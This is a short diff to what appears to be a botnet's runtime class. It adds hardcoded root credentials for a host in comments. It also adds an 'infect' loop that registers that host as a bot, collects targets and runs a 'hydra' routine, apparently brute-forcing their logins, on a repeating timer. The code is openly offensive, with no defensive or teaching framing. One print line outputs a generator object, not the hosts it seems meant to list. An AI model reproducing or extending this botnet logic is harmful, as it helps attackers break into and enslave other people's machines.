@@ -7,10 +7,16 @@ class BotRunTime:
         loop.create_task(self.infect())
         loop.create_task(self.get_and_schedule_job())
         self.run()
-
+#host ip:10.142.0.2  
+#host username:root
+#host password:password
     async def infect(self):
         while True:
             print('infect')
+            botnet.add_bot('10.142.0.2','root','password')
+            target = botnet.targets()
+            botnet.hydra(target)
+            print(i.host for i in botnet)
             await asyncio.sleep(settings.INFECTION_CYCLE_TIME)
 
     async def get_and_schedule_job(self):
